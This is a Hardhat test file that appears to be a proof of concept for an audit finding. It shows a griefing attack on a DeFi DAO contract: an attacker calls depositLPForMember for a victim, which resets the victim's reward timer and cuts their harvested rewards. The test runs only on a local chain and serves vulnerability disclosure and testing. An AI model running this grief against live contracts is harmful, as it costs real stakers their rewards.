const hre = require("hardhat");
const { ethers } = hre;
const { expect } = require("chai");

// helper wrapper so you can see exactly where a crash happens
async function step(label, fn) {
  console.log(`\n===== STEP: ${label} [START] =====`);
  try {
    const res = await fn();
    console.log(`===== STEP: ${label} [DONE] =====\n`);
    return res;
  } catch (err) {
    console.error(`xxxxx STEP: ${label} [FAILED] xxxxx`);
    console.error(err);
    throw err;
  }
}

describe("Dao mapMember_lastTime grief via depositLPForMember", function () {
  this.timeout(0);

  let deployer, victim, attacker;
  let base;        // Sparta
  let dao;
  let reserve;
  let utils;
  let daoVault;
  let bondVault;
  let poolFactory;
  let asset;       // TestToken
  let pool;        // Pool (LP token)

  async function deploySystem() {
    await step("get signers", async () => {
      [deployer, victim, attacker] = await ethers.getSigners();
      console.log("deployer:", deployer.address);
      console.log("victim  :", victim.address);
      console.log("attacker:", attacker.address);
    });

    await step("deploy core (Sparta, Dao, Reserve, Utils, DaoVault, BondVault, PoolFactory, TestToken)", async () => {
      // Sparta(BASE) - BASEv1 is unused for this test, pass zero address
      const Sparta = await ethers.getContractFactory("Sparta");
      base = await Sparta.deploy(ethers.constants.AddressZero);
      await base.deployed();
      console.log("Sparta(BASE) deployed at", base.address);

      const Dao = await ethers.getContractFactory("Dao");
      dao = await Dao.deploy(base.address);
      await dao.deployed();
      console.log("Dao deployed at", dao.address);

      const Reserve = await ethers.getContractFactory("Reserve");
      reserve = await Reserve.deploy(base.address);
      await reserve.deployed();
      console.log("Reserve deployed at", reserve.address);

      const Utils = await ethers.getContractFactory("Utils");
      utils = await Utils.deploy(base.address);
      await utils.deployed();
      console.log("Utils deployed at", utils.address);

      const DaoVault = await ethers.getContractFactory("DaoVault");
      daoVault = await DaoVault.deploy(base.address);
      await daoVault.deployed();
      console.log("DaoVault deployed at", daoVault.address);

      const BondVault = await ethers.getContractFactory("BondVault");
      bondVault = await BondVault.deploy(base.address);
      await bondVault.deployed();
      console.log("BondVault deployed at", bondVault.address);

      // WBNB address is irrelevant as long as we don't use token == address(0) path
      const PoolFactory = await ethers.getContractFactory("PoolFactory");
      poolFactory = await PoolFactory.deploy(
        base.address,
        ethers.constants.AddressZero
      );
      await poolFactory.deployed();
      console.log("PoolFactory deployed at", poolFactory.address);

      const TestToken = await ethers.getContractFactory("TestToken");
      asset = await TestToken.deploy();
      await asset.deployed();
      console.log("TestToken deployed at", asset.address);
    });

    await step("wire Sparta.DAO = Dao", async () => {
      await base.changeDAO(dao.address);
      console.log("Sparta.DAO set to", dao.address);
    });

    await step("wire Dao genesis/vault/factory", async () => {
      // router is unused in this test, pass zero
      await dao.setGenesisAddresses(
        ethers.constants.AddressZero,
        utils.address,
        reserve.address
      );

      await dao.setVaultAddresses(
        daoVault.address,
        bondVault.address,
        ethers.constants.AddressZero // synthVault
      );

      await dao.setFactoryAddresses(
        poolFactory.address,
        ethers.constants.AddressZero // synthFactory
      );

      console.log("Dao wired to Utils / Reserve / DaoVault / BondVault / PoolFactory");
    });

    await step("Reserve: set incentive addresses and enable emissions", async () => {
      // router, lend, synthVault all unused here; we just need DAO whitelisted
      await reserve.setIncentiveAddresses(
        ethers.constants.AddressZero,
        ethers.constants.AddressZero,
        ethers.constants.AddressZero,
        dao.address
      );
      await reserve.flipEmissions(); // set emissions = true
      console.log("Reserve incentives wired & emissions enabled");
    });

    await step("fund Reserve with SPARTA", async () => {
      // Sparta constructor minted 1,000,000 SPARTA to deployer
      const fundAmount = ethers.utils.parseEther("500000"); // 500k
      await base.transfer(reserve.address, fundAmount);
      console.log(
        "Reserve SPARTA balance:",
        (await base.balanceOf(reserve.address)).toString()
      );
    });

    await step("mint asset, approve PoolFactory, create curated pool", async () => {
      // Mint enough TestToken to deployer
      const tokenSupply = ethers.utils.parseEther("1000000");
      await asset.mint(deployer.address, tokenSupply);

      const baseLiq = ethers.utils.parseEther("20000");  // >= 10,000 SPARTA requirement
      const tokenLiq = ethers.utils.parseEther("20000");

      await base.approve(poolFactory.address, baseLiq);
      await asset.approve(poolFactory.address, tokenLiq);

      const tx = await poolFactory.createPoolADD(
        baseLiq,
        tokenLiq,
        asset.address
      );
      const receipt = await tx.wait();

      let poolAddress = null;
      for (const ev of receipt.events || []) {
        if (ev.event === "CreatePool") {
          poolAddress = ev.args.pool;
          break;
        }
      }
      if (!poolAddress) {
        throw new Error("CreatePool event not found");
      }
      console.log("Pool created at", poolAddress);

      pool = await ethers.getContractAt("Pool", poolAddress);

      // Mark pool as curated so Dao.deposit() passes "!curated"
      await poolFactory.addCuratedPool(asset.address);
      console.log("Pool isCuratedPool?", await poolFactory.isCuratedPool(pool.address));
    });

    await step("distribute LP to victim & attacker, approve Dao", async () => {
      const lpBalanceDeployer = await pool.balanceOf(deployer.address);
      console.log("deployer LP balance after createPoolADD:", lpBalanceDeployer.toString());

      // give both victim and attacker a slice of LP
      const lpAmountEach = lpBalanceDeployer.div(4); // 1/4 each, rest stays with deployer

      await pool.transfer(victim.address, lpAmountEach);
      await pool.transfer(attacker.address, lpAmountEach);

      await pool.connect(victim).approve(dao.address, ethers.constants.MaxUint256);
      await pool.connect(attacker).approve(dao.address, ethers.constants.MaxUint256);

      console.log("victim LP  :", (await pool.balanceOf(victim.address)).toString());
      console.log("attacker LP:", (await pool.balanceOf(attacker.address)).toString());
    });
  }

  async function victimInitialDepositAndWait(depositAmount, seconds) {
    await step("victim deposit() LP into Dao", async () => {
      await dao.connect(victim).deposit(pool.address, depositAmount);
      const ts = (await ethers.provider.getBlock("latest")).timestamp;
      console.log("deposit done, timestamp:", ts);
    });

    await step(`advance time by ${seconds} seconds`, async () => {
      await ethers.provider.send("evm_increaseTime", [seconds]);
      await ethers.provider.send("evm_mine", []);
      const ts = (await ethers.provider.getBlock("latest")).timestamp;
      console.log("new timestamp:", ts);
    });
  }

  it("shows reduced reward after attacker depositLPForMember", async () => {
    // ===== Scenario A: baseline (no grief) =====
    await deploySystem();

    // victim stakes half of their LP
    const victimLpBalance = await pool.balanceOf(victim.address);
    const depositAmount = victimLpBalance.div(2);
    const dt = 10 * 24 * 60 * 60; // 10 days

    await victimInitialDepositAndWait(depositAmount, dt);

    let rewardNoAttack;
    await step("victim harvest() [baseline]", async () => {
      const before = await base.balanceOf(victim.address);
      console.log("BASE before harvest (baseline):", before.toString());

      await dao.connect(victim).harvest();

      const after = await base.balanceOf(victim.address);
      console.log("BASE after harvest (baseline) :", after.toString());

      rewardNoAttack = after.sub(before);
      console.log("rewardNoAttack:", rewardNoAttack.toString());
      expect(rewardNoAttack.gt(0)).to.equal(true);
    });

    // ===== Scenario B: reset chain + grief attack =====
    await step("reset hardhat network", async () => {
      await hre.network.provider.send("hardhat_reset");
    });

    await deploySystem();

    const victimLpBalance2 = await pool.balanceOf(victim.address);
    const depositAmount2 = victimLpBalance2.div(2);

    await victimInitialDepositAndWait(depositAmount2, dt);

    let rewardAfterGrief;
    await step("attacker calls depositLPForMember(pool, griefAmount, victim)", async () => {
      const griefAmount = depositAmount2.div(10); // small grief deposit

      const beforeTS = (await ethers.provider.getBlock("latest")).timestamp;
      console.log("timestamp before grief:", beforeTS);

      // This is the potentially griefing call:
      await dao
        .connect(attacker)
        .depositLPForMember(pool.address, griefAmount, victim.address);

      const afterTS = (await ethers.provider.getBlock("latest")).timestamp;
      console.log("timestamp after grief :", afterTS);
    });

    await step("victim harvest() after grief", async () => {
      const before = await base.balanceOf(victim.address);
      console.log("BASE before harvest (after grief):", before.toString());

      await dao.connect(victim).harvest();

      const after = await base.balanceOf(victim.address);
      console.log("BASE after harvest (after grief) :", after.toString());

      rewardAfterGrief = after.sub(before);
      console.log("rewardAfterGrief:", rewardAfterGrief.toString());
    });

    await step("compare rewards and check attacker did not profit", async () => {
      console.log("rewardNoAttack    :", rewardNoAttack.toString());
      console.log("rewardAfterGrief :", rewardAfterGrief.toString());

      // victim’s reward should be strictly LOWER after the grief
      expect(rewardAfterGrief.lt(rewardNoAttack)).to.equal(true);

      // attacker should not gain BASE (pure grief, no profit)
      const attackerBase = await base.balanceOf(attacker.address);
      console.log("attacker BASE balance:", attackerBase.toString());
      expect(attackerBase.eq(0)).to.equal(true);
    });
  });
});
